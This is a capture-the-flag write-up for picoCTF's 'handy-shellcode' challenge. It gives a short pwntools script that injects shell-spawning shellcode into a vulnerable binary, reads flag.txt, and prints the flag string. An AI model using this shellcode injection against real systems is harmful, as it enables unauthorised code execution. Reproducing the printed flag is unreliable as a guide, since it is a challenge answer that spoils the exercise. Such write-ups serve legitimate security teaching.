# handy-shellcode

Points: 50

## Problem
> This [program](vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5 on the shell server. [Source](vuln.c).

## Hints
> You might be able to find some good shellcode online.

## Solution

Using a shellcode from Python's `pwntools` library, we get the flag with the following script:

```python
#!/usr/bin/env python3

from pwn import *
import re

# connect to the vuln binary
sh = process("./vuln")

# actual shellcode
shellcode = asm(shellcraft.i386.linux.sh())

# send the shellcode
sh.sendlineafter(":\n", shellcode)

# get the content of flag.txt
sh.sendline("cat flag.txt")
sh.recv()

# extract the flag from the response using regex
print(re.findall("picoCTF{.*}", str(sh.recv()))[0])
```

## Flag

`picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}`